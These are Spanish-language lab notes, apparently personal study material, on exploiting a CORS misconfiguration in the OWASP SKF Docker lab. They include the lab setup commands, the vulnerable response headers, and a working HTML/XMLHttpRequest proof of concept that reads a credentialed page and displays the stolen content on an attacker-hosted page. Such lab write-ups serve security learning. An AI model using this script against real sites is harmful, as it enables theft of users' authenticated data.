> Un ataque CORS ocurre cuando una aplicación web mal configurada confía excesivamente en orígenes externos, permitiendo a atacantes robar datos sensibles (cookies, tokens) mediante solicitudes fetch o XMLHttpRequest. Se explota cuando el servidor refleja la cabecera Origin sin validarla o usa Access-Control-Allow-Origin: * con credenciales, permitiendo el robo de info.

## Laboratorio
- `docker pull blabla1337/owasp-skf-lab:cors`
- `docker run -it -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:core`

## Ataque
- La vulnerabilidad se ve con este encabezado:
```
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: *
```
- Donde nos deja llamar a este dominio desde cualquier otro dominio

- Podemos agregar en la request este encabezado
```
Origin: https://localhost
```
- Veremos en la respuesta
```
Access-Control-Allow-Origin: https://localhost
```

- Ahora podemos crear un script para agarrar toda la pagina y poner en un dominio propio
```html
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open("GET", "http://localhost:5000/confidencial", true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    document.getElementById("stolenData").innerHTML = req.responseText;
  }
</script>

<center><h1>Has sido hackeado, te he robado esto</h1></center>

<p id="stolenData"></p>
```
- Lo servimos con python y ya esta.